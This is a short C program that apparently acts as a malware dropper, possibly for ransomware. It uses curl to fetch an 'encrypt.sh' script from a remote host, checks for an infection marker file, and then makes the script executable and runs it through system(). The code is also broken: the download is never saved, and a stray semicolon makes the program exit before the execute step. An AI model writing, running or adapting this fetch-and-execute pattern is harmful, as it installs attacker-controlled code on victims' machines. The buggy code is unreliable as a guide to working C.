#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/utsname.h>

int check_infected(const char *filename){
    struct stat buffer;
    int exist = stat(filename,&buffer);
    if(exist == 0){
        exit(1);
    }
    else{
        return 0;

    }

}

int main(void){ 
    /*Detects host OS*/
    struct utsname buffer;
    if (uname(&buffer) !=0) {
        perror("uname");
        return 1;
    }

    char *command = malloc(60 * sizeof(char));
    strcpy(command, "cd /tmp && curl http://example.com/encrypt.sh");
    system(command);
    free(command);

    if (check_infected("/tmp/ghost_shell.c"));{
        return 1;
    } /*doesn't run if system is infected*/
        
    /*allocates memory again, executes script*/

    command = malloc(100 * sizeof(char)); 
    strcpy(command, "chmod +x /tmp/encrypt.sh &&/tmp/encrypt.sh");
    system(command);
    free(command);

    return 0;
}
